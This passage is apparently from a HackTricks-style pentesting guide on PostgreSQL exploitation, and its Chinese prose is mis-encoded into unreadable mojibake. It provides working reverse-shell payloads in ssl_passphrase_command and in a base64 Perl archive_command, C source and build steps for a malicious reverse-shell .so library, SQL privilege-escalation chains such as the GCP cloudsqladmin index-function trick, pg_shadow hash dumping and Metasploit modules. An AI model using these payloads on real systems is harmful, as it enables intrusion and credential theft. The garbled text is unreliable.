* `ssl_passphrase_command_supports_reload = off` å¦‚æœæ­¤å±æ€§ä¸º**on**ï¼Œåˆ™åœ¨æ‰§è¡Œ`pg_reload_conf()`æ—¶ï¼Œå¦‚æœå¯†é’¥å—å¯†ç ä¿æŠ¤ï¼Œå°†æ‰§è¡Œ**å‘½ä»¤**ã€‚

ç„¶åï¼Œæ”»å‡»è€…éœ€è¦ï¼š

1. ä»æœåŠ¡å™¨**è½¬å‚¨ç§é’¥**
2. **åŠ å¯†**ä¸‹è½½çš„ç§é’¥ï¼š
3. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
4. **è¦†ç›–**
5. **è½¬å‚¨**å½“å‰çš„PostgreSQL **é…ç½®**
6. ä½¿ç”¨ä¸Šè¿°å±æ€§é…ç½®**è¦†ç›–** **é…ç½®**ï¼š
7. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
8. `ssl_passphrase_command_supports_reload = on`
9. æ‰§è¡Œ `pg_reload_conf()`

åœ¨æµ‹è¯•ä¸­æˆ‘æ³¨æ„åˆ°ï¼Œè¿™åªæœ‰åœ¨**ç§é’¥æ–‡ä»¶å…·æœ‰640æƒé™**ï¼Œ**ç”±rootæ‹¥æœ‰**å¹¶ä¸”ç”±**ssl-certæˆ–postgresç»„æ‹¥æœ‰**ï¼ˆå› æ­¤postgresç”¨æˆ·å¯ä»¥è¯»å–å®ƒï¼‰ï¼Œå¹¶ä¸”æ”¾ç½®åœ¨\_/var/lib/postgresql/12/main\_ä¸­æ—¶æ‰æœ‰æ•ˆã€‚

#### **ä½¿ç”¨archive\_commandè¿›è¡ŒRCE**

æœ‰å…³æ­¤é…ç½®å’ŒWALçš„æ›´å¤š[**ä¿¡æ¯è¯·ç‚¹å‡»æ­¤å¤„**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**ã€‚**

é…ç½®æ–‡ä»¶ä¸­çš„å¦ä¸€ä¸ªå¯åˆ©ç”¨å±æ€§æ˜¯`archive_command`ã€‚

ä¸ºäº†ä½¿å…¶å·¥ä½œï¼Œ`archive_mode`è®¾ç½®å¿…é¡»ä¸º`'on'`æˆ–`'always'`ã€‚å¦‚æœæ˜¯è¿™æ ·ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¦†ç›–`archive_command`ä¸­çš„å‘½ä»¤ï¼Œå¹¶é€šè¿‡WALï¼ˆé¢„å†™å¼æ—¥å¿—è®°å½•ï¼‰æ“ä½œå¼ºåˆ¶æ‰§è¡Œå®ƒã€‚

ä¸€èˆ¬æ­¥éª¤æ˜¯ï¼š

1. æ£€æŸ¥å½’æ¡£æ¨¡å¼æ˜¯å¦å·²å¯ç”¨ï¼š`SELECT current_setting('archive_mode')`
2. ä½¿ç”¨æœ‰æ•ˆè½½è·è¦†ç›–`archive_command`ã€‚ä¾‹å¦‚ï¼Œåå‘shellï¼š`archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. é‡æ–°åŠ è½½é…ç½®ï¼š`SELECT pg_reload_conf()`
4. å¼ºåˆ¶è¿è¡ŒWALæ“ä½œï¼Œè¿™å°†è°ƒç”¨å½’æ¡£å‘½ä»¤ï¼š`SELECT pg_switch_wal()`æˆ–å¯¹äºæŸäº›Postgresç‰ˆæœ¬`SELECT pg_switch_xlog()`

#### **ä½¿ç”¨é¢„åŠ è½½åº“è¿›è¡ŒRCE**

æœ‰å…³æ­¤æŠ€æœ¯çš„æ›´å¤šä¿¡æ¯[è¯·ç‚¹å‡»æ­¤å¤„](https://adeadfed.com/posts/postgresql-select-only-rce/)ã€‚

æ­¤æ”»å‡»å‘é‡åˆ©ç”¨ä»¥ä¸‹é…ç½®å˜é‡ï¼š

* `session_preload_libraries` -- PostgreSQLæœåŠ¡å™¨åœ¨å®¢æˆ·ç«¯è¿æ¥æ—¶å°†åŠ è½½çš„åº“ã€‚
* `dynamic_library_path` -- PostgreSQLæœåŠ¡å™¨å°†æœç´¢åº“çš„ç›®å½•åˆ—è¡¨ã€‚

æˆ‘ä»¬å¯ä»¥å°†`dynamic_library_path`å€¼è®¾ç½®ä¸º`postgres`ç”¨æˆ·è¿è¡Œæ•°æ®åº“çš„å¯å†™ç›®å½•ï¼Œä¾‹å¦‚`/tmp/`ç›®å½•ï¼Œå¹¶åœ¨é‚£é‡Œä¸Šä¼ ä¸€ä¸ªæ¶æ„çš„`.so`å¯¹è±¡ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†é€šè¿‡å°†å…¶åŒ…å«åœ¨`session_preload_libraries`å˜é‡ä¸­ï¼Œå¼ºåˆ¶PostgreSQLæœåŠ¡å™¨åŠ è½½æˆ‘ä»¬æ–°ä¸Šä¼ çš„åº“ã€‚

æ”»å‡»æ­¥éª¤ä¸ºï¼š

1. ä¸‹è½½åŸå§‹çš„`postgresql.conf`
2. åœ¨`dynamic_library_path`å€¼ä¸­åŒ…å«`/tmp/`ç›®å½•ï¼Œä¾‹å¦‚`dynamic_library_path = '/tmp:$libdir'`
3. åœ¨`session_preload_libraries`å€¼ä¸­åŒ…å«æ¶æ„åº“åç§°ï¼Œä¾‹å¦‚`session_preload_libraries = 'payload.so'`
4. é€šè¿‡`SELECT version()`æŸ¥è¯¢æ£€æŸ¥ä¸»è¦çš„PostgreSQLç‰ˆæœ¬
5. ä½¿ç”¨æ­£ç¡®çš„PostgreSQL devåŒ…ç¼–è¯‘æ¶æ„åº“ä»£ç ç¤ºä¾‹ä»£ç ï¼š

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

ç¼–è¯‘ä»£ç ï¼š

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. ä¸Šä¼ åœ¨æ­¥éª¤2-3ä¸­åˆ›å»ºçš„æ¶æ„`postgresql.conf`ï¼Œå¹¶è¦†ç›–åŸå§‹æ–‡ä»¶
7. å°†æ­¥éª¤5ä¸­çš„`payload.so`ä¸Šä¼ åˆ°`/tmp`ç›®å½•
8. é€šè¿‡é‡æ–°å¯åŠ¨æœåŠ¡å™¨æˆ–è°ƒç”¨`SELECT pg_reload_conf()`æŸ¥è¯¢é‡æ–°åŠ è½½æœåŠ¡å™¨é…ç½®
9. åœ¨ä¸‹ä¸€ä¸ªæ•°æ®åº“è¿æ¥æ—¶ï¼Œæ‚¨å°†æ”¶åˆ°åå‘shellè¿æ¥ã€‚

## **Postgresææƒ**

### CREATEROLEææƒ

#### **æˆæƒ**

æ ¹æ®[**æ–‡æ¡£**](https://www.postgresql.org/docs/13/sql-grant.html): _å…·æœ‰\*\*`CREATEROLE`**æƒé™çš„è§’è‰²å¯ä»¥**æˆäºˆæˆ–æ’¤é”€**ä»»ä½•**ä¸æ˜¯**è¶…çº§ç”¨æˆ·çš„**è§’è‰²\*\*çš„æˆå‘˜èµ„æ ¼ã€‚_

å› æ­¤ï¼Œå¦‚æœæ‚¨æ‹¥æœ‰\*\*`CREATEROLE`**æƒé™ï¼Œæ‚¨å¯ä»¥æˆäºˆè‡ªå·±è®¿é—®å…¶ä»–**è§’è‰²\*\*ï¼ˆä¸æ˜¯è¶…çº§ç”¨æˆ·ï¼‰çš„æƒé™ï¼Œè¿™å¯ä»¥è®©æ‚¨è¯»å–å’Œå†™å…¥æ–‡ä»¶ä»¥åŠæ‰§è¡Œå‘½ä»¤ï¼š

```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```

#### ä¿®æ”¹å¯†ç 

æ‹¥æœ‰æ­¤è§’è‰²çš„ç”¨æˆ·è¿˜å¯ä»¥**æ›´æ”¹**å…¶ä»–**éè¶…çº§ç”¨æˆ·**çš„**å¯†ç **ï¼š

```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```

#### æå‡ä¸ºè¶…çº§ç”¨æˆ·

é€šå¸¸æƒ…å†µä¸‹ï¼Œä¼šå‘ç°**æœ¬åœ°ç”¨æˆ·å¯ä»¥åœ¨ PostgreSQL ä¸­ç™»å½•è€Œæ— éœ€æä¾›ä»»ä½•å¯†ç **ã€‚å› æ­¤ï¼Œä¸€æ—¦æ‚¨è·å¾—äº†**æ‰§è¡Œä»£ç çš„æƒé™**ï¼Œæ‚¨å¯ä»¥æ»¥ç”¨è¿™äº›æƒé™æ¥è·å–\*\*`SUPERUSER`\*\*è§’è‰²ï¼š

```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```

è¿™é€šå¸¸æ˜¯å› ä¸º\*\*`pg_hba.conf`\*\*æ–‡ä»¶ä¸­çš„ä»¥ä¸‹å‡ è¡Œï¼š

```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```

### **ALTER TABLEææƒ**

åœ¨[**è¿™ç¯‡æ–‡ç« **](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities)ä¸­è§£é‡Šäº†å¦‚ä½•åœ¨Postgres GCPä¸­æ»¥ç”¨æˆäºˆç”¨æˆ·çš„ALTER TABLEæƒé™æ¥è¿›è¡Œ**ææƒ**ã€‚

å½“æ‚¨å°è¯•**å°†å¦ä¸€ä¸ªç”¨æˆ·è®¾ä¸ºè¡¨çš„æ‰€æœ‰è€…**æ—¶ï¼Œåº”è¯¥ä¼šæ”¶åˆ°**é”™è¯¯**ä»¥é˜»æ­¢æ­¤æ“ä½œï¼Œä½†æ˜¾ç„¶GCPå…è®¸éè¶…çº§ç”¨æˆ·postgresç”¨æˆ·æ‰§è¡Œæ­¤æ“ä½œï¼š

<figure><img src="https://github.com/carlospolop/hacktricks/blob/cn/.gitbook/assets/image%20(4)%20(1)%20(1)%20(1)%20(2)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>

ç»“åˆè¿™ä¸ªæƒ³æ³•ï¼Œå½“åœ¨å…·æœ‰ç´¢å¼•å‡½æ•°çš„è¡¨ä¸Šæ‰§è¡Œ**INSERT/UPDATE/ANALYZE**å‘½ä»¤æ—¶ï¼Œè¯¥**å‡½æ•°**ä¼šä½œä¸ºå‘½ä»¤çš„ä¸€éƒ¨åˆ†ä»¥**è¡¨æ‰€æœ‰è€…çš„æƒé™**è¢«**è°ƒç”¨**ã€‚å¯ä»¥åˆ›å»ºä¸€ä¸ªå¸¦æœ‰å‡½æ•°çš„ç´¢å¼•ï¼Œå¹¶å°†æ‰€æœ‰è€…æƒé™æˆäºˆ**è¶…çº§ç”¨æˆ·**ï¼Œç„¶åå¯¹å…·æœ‰æ¶æ„å‡½æ•°çš„è¡¨è¿è¡ŒANALYZEï¼Œè¯¥å‡½æ•°å°†èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ï¼Œå› ä¸ºå®ƒæ­£åœ¨ä½¿ç”¨æ‰€æœ‰è€…çš„æƒé™ã€‚

```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```

#### åˆ©ç”¨

1. é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–°è¡¨ã€‚
2. å‘è¡¨ä¸­æ’å…¥ä¸€äº›æ— å…³å†…å®¹ï¼Œä»¥æä¾›ç´¢å¼•å‡½æ•°çš„æ•°æ®ã€‚
3. å¼€å‘ä¸€ä¸ªåŒ…å«ä»£ç æ‰§è¡Œè´Ÿè½½çš„æ¶æ„ç´¢å¼•å‡½æ•°ï¼Œå…è®¸æ‰§è¡Œæœªç»æˆæƒçš„å‘½ä»¤ã€‚
4. å°†è¡¨çš„æ‰€æœ‰è€…æ›´æ”¹ä¸º"cloudsqladmin"ï¼Œè¿™æ˜¯GCPä¸“é—¨ç”¨äºç®¡ç†å’Œç»´æŠ¤æ•°æ®åº“çš„è¶…çº§ç”¨æˆ·è§’è‰²ã€‚
5. å¯¹è¡¨æ‰§è¡ŒANALYZEæ“ä½œã€‚æ­¤æ“ä½œè¿«ä½¿PostgreSQLå¼•æ“åˆ‡æ¢åˆ°è¡¨æ‰€æœ‰è€…"cloudsqladmin"çš„ç”¨æˆ·ä¸Šä¸‹æ–‡ã€‚å› æ­¤ï¼Œæ¶æ„ç´¢å¼•å‡½æ•°å°†ä»¥"cloudsqladmin"çš„æƒé™è°ƒç”¨ï¼Œä»è€Œä½¿å…ˆå‰æœªç»æˆæƒçš„shellå‘½ä»¤å¾—ä»¥æ‰§è¡Œã€‚

åœ¨PostgreSQLä¸­ï¼Œè¿™ä¸ªæµç¨‹çœ‹èµ·æ¥åƒè¿™æ ·ï¼š

```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```

ç„¶åï¼Œ`shell_commands_results`è¡¨å°†åŒ…å«æ‰§è¡Œä»£ç çš„è¾“å‡ºï¼š

```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```

### æœ¬åœ°ç™»å½•

ä¸€äº›é…ç½®ä¸å½“çš„PostgreSQLå®ä¾‹å¯èƒ½å…è®¸ä»»ä½•æœ¬åœ°ç”¨æˆ·ç™»å½•ï¼Œå¯ä»¥ä½¿ç”¨\*\*`dblink`å‡½æ•°\*\*ä»127.0.0.1æœ¬åœ°ç™»å½•ï¼š

```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```

{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œä¸ºäº†ä½¿ä¸Šä¸€ä¸ªæŸ¥è¯¢èµ·ä½œç”¨ï¼Œ**éœ€è¦å­˜åœ¨å‡½æ•° `dblink`**ã€‚å¦‚æœä¸å­˜åœ¨ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»ºå®ƒï¼š

```sql
CREATE EXTENSION dblink;
```
{% endhint %}

å¦‚æœæ‚¨æ‹¥æœ‰å…·æœ‰æ›´é«˜æƒé™çš„ç”¨æˆ·å¯†ç ï¼Œä½†è¯¥ç”¨æˆ·ä¸å…è®¸ä»å¤–éƒ¨IPç™»å½•ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡½æ•°ä»¥è¯¥ç”¨æˆ·èº«ä»½æ‰§è¡ŒæŸ¥è¯¢ï¼š

```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```

å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•æ£€æŸ¥è¯¥å‡½æ•°æ˜¯å¦å­˜åœ¨ï¼š

```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```

### **å…·æœ‰** SECURITY DEFINER **çš„è‡ªå®šä¹‰å®šä¹‰å‡½æ•°**

[**åœ¨è¿™ç¯‡æ–‡ç« ä¸­**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql)ï¼Œæ¸—é€æµ‹è¯•äººå‘˜èƒ½å¤Ÿåœ¨ç”±IBMæä¾›çš„postgreså®ä¾‹å†…æå‡æƒé™ï¼Œå› ä¸ºä»–ä»¬**å‘ç°äº†å¸¦æœ‰ SECURITY DEFINER æ ‡å¿—çš„æ­¤å‡½æ•°**ï¼š

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
â€¦
</code></pre>

æ­£å¦‚[**æ–‡æ¡£ä¸­æ‰€è§£é‡Šçš„**](https://www.postgresql.org/docs/current/sql-createfunction.html)ï¼Œå…·æœ‰ **SECURITY DEFINER çš„å‡½æ•°** å°†ä»¥ **æ‹¥æœ‰å®ƒçš„ç”¨æˆ·çš„æƒé™** æ‰§è¡Œã€‚å› æ­¤ï¼Œå¦‚æœå‡½æ•°**å®¹æ˜“å—åˆ° SQL æ³¨å…¥æ”»å‡»**ï¼Œæˆ–è€…ä½¿ç”¨äº†ä¸€äº›**ç”±æ”»å‡»è€…æ§åˆ¶çš„å‚æ•°æ‰§è¡Œç‰¹æƒæ“ä½œ**ï¼Œåˆ™å¯èƒ½è¢«æ»¥ç”¨ä»¥**åœ¨ postgres å†…æå‡æƒé™**ã€‚

åœ¨ä¸Šè¿°ä»£ç çš„ç¬¬4è¡Œä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°è¯¥å‡½æ•°å…·æœ‰ **SECURITY DEFINER** æ ‡å¿—ã€‚

```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```

### é€šè¿‡PL/pgSQLè¿›è¡Œæš´åŠ›ç ´è§£

**PL/pgSQL**æ˜¯ä¸€ç§**åŠŸèƒ½é½å…¨çš„ç¼–ç¨‹è¯­è¨€**ï¼Œä¸SQLç›¸æ¯”æä¾›äº†æ›´å¤§çš„è¿‡ç¨‹æ§åˆ¶ã€‚å®ƒå¯ä»¥ä½¿ç”¨**å¾ªç¯**å’Œå…¶ä»–**æ§åˆ¶ç»“æ„**æ¥å¢å¼ºç¨‹åºé€»è¾‘ã€‚æ­¤å¤–ï¼Œ**SQLè¯­å¥**å’Œ**è§¦å‘å™¨**å¯ä»¥è°ƒç”¨ä½¿ç”¨**PL/pgSQLè¯­è¨€**åˆ›å»ºçš„å‡½æ•°ã€‚è¿™ç§é›†æˆå…è®¸æ›´å…¨é¢å’Œå¤šåŠŸèƒ½çš„æ•°æ®åº“ç¼–ç¨‹å’Œè‡ªåŠ¨åŒ–æ–¹æ³•ã€‚\
**æ‚¨å¯ä»¥æ»¥ç”¨è¿™ç§è¯­è¨€æ¥è¦æ±‚PostgreSQLæš´åŠ›ç ´è§£ç”¨æˆ·å‡­æ®ã€‚**

### é€šè¿‡è¦†ç›–å†…éƒ¨PostgreSQLè¡¨è¿›è¡Œæƒé™æå‡

{% hint style="info" %}
ä»¥ä¸‹æƒé™æå‡å‘é‡åœ¨å—é™åˆ¶çš„SQLiç¯å¢ƒä¸­ç‰¹åˆ«æœ‰ç”¨ï¼Œå› ä¸ºæ‰€æœ‰æ­¥éª¤éƒ½å¯ä»¥é€šè¿‡åµŒå¥—çš„SELECTè¯­å¥æ‰§è¡Œ
{% endhint %}

å¦‚æœæ‚¨å¯ä»¥**è¯»å†™PostgreSQLæœåŠ¡å™¨æ–‡ä»¶**ï¼Œæ‚¨å¯ä»¥é€šè¿‡è¦†ç›–ä¸å†…éƒ¨`pg_authid`è¡¨å…³è”çš„PostgreSQLç£ç›˜æ–‡ä»¶èŠ‚ç‚¹ï¼Œ**æˆä¸ºè¶…çº§ç”¨æˆ·**ã€‚

äº†è§£æœ‰å…³**æ­¤æŠ€æœ¯**çš„æ›´å¤šä¿¡æ¯[**åœ¨è¿™é‡Œ**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**ã€‚**

æ”»å‡»æ­¥éª¤å¦‚ä¸‹ï¼š

1. è·å–PostgreSQLæ•°æ®ç›®å½•
2. è·å–ä¸`pg_authid`è¡¨å…³è”çš„æ–‡ä»¶èŠ‚ç‚¹çš„ç›¸å¯¹è·¯å¾„
3. é€šè¿‡`lo_*`å‡½æ•°ä¸‹è½½æ–‡ä»¶èŠ‚ç‚¹
4. è·å–ä¸`pg_authid`è¡¨å…³è”çš„æ•°æ®ç±»å‹
5. ä½¿ç”¨[PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor)æ¥[ç¼–è¾‘æ–‡ä»¶èŠ‚ç‚¹](https://adeadfed.com/posts/updating-postgresql-data-without-update/#privesc-updating-pg\_authid-table); å°†æ‰€æœ‰`rol*`å¸ƒå°”æ ‡å¿—è®¾ç½®ä¸º1ä»¥è·å–å®Œå…¨æƒé™ã€‚
6. é€šè¿‡`lo_*`å‡½æ•°é‡æ–°ä¸Šä¼ ç¼–è¾‘åçš„æ–‡ä»¶èŠ‚ç‚¹ï¼Œå¹¶è¦†ç›–ç£ç›˜ä¸Šçš„åŸå§‹æ–‡ä»¶
7. \_(å¯é€‰)\_é€šè¿‡è¿è¡Œæ˜‚è´µçš„SQLæŸ¥è¯¢æ¥æ¸…é™¤å†…å­˜è¡¨ç¼“å­˜
8. æ‚¨ç°åœ¨åº”è¯¥å…·æœ‰å®Œæ•´è¶…çº§ç®¡ç†å‘˜æƒé™ã€‚

## **POST**

```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```

### æ—¥å¿—è®°å½•

åœ¨ _**postgresql.conf**_ æ–‡ä»¶ä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡æ›´æ”¹ä»¥ä¸‹è®¾ç½®æ¥å¯ç”¨postgresqlæ—¥å¿—è®°å½•ï¼š

```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```

ç„¶åï¼Œ**é‡æ–°å¯åŠ¨æœåŠ¡**ã€‚

### pgadmin

[pgadmin](https://www.pgadmin.org) æ˜¯ç”¨äº PostgreSQL çš„ç®¡ç†å’Œå¼€å‘å¹³å°ã€‚\
æ‚¨å¯ä»¥åœ¨ _**pgadmin4.db**_ æ–‡ä»¶ä¸­æ‰¾åˆ°**å¯†ç **ã€‚\
æ‚¨å¯ä»¥ä½¿ç”¨è„šæœ¬ä¸­çš„ _**decrypt**_ å‡½æ•°å¯¹å…¶è¿›è¡Œè§£å¯†ï¼š[https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)

```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```

### pg\_hba

PostgreSQLä¸­çš„å®¢æˆ·ç«¯èº«ä»½éªŒè¯é€šè¿‡ä¸€ä¸ªåä¸º**pg\_hba.conf**çš„é…ç½®æ–‡ä»¶è¿›è¡Œç®¡ç†ã€‚è¯¥æ–‡ä»¶åŒ…å«ä¸€ç³»åˆ—è®°å½•ï¼Œæ¯ä¸ªè®°å½•æŒ‡å®šè¿æ¥ç±»å‹ã€å®¢æˆ·ç«¯IPåœ°å€èŒƒå›´ï¼ˆå¦‚æœé€‚ç”¨ï¼‰ã€æ•°æ®åº“åç§°ã€ç”¨æˆ·åä»¥åŠç”¨äºåŒ¹é…è¿æ¥çš„èº«ä»½éªŒè¯æ–¹æ³•ã€‚ä¸è¿æ¥ç±»å‹ã€å®¢æˆ·ç«¯åœ°å€ã€è¯·æ±‚çš„æ•°æ®åº“å’Œç”¨æˆ·ååŒ¹é…çš„ç¬¬ä¸€æ¡è®°å½•ç”¨äºèº«ä»½éªŒè¯ã€‚å¦‚æœèº«ä»½éªŒè¯å¤±è´¥ï¼Œæ²¡æœ‰å¤‡ç”¨é€‰é¡¹æˆ–å¤‡ä»½ã€‚å¦‚æœæ²¡æœ‰è®°å½•åŒ¹é…ï¼Œåˆ™æ‹’ç»è®¿é—®ã€‚

åœ¨pg\_hba.confä¸­å¯ç”¨çš„åŸºäºå¯†ç çš„èº«ä»½éªŒè¯æ–¹æ³•æœ‰**md5**ã€**crypt**å’Œ**password**ã€‚è¿™äº›æ–¹æ³•åœ¨å¯†ç ä¼ è¾“æ–¹å¼ä¸Šæœ‰æ‰€ä¸åŒï¼šMD5å“ˆå¸Œã€cryptåŠ å¯†æˆ–æ˜æ–‡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œcryptæ–¹æ³•ä¸èƒ½ä¸åœ¨pg\_authidä¸­åŠ å¯†çš„å¯†ç ä¸€èµ·ä½¿ç”¨ã€‚
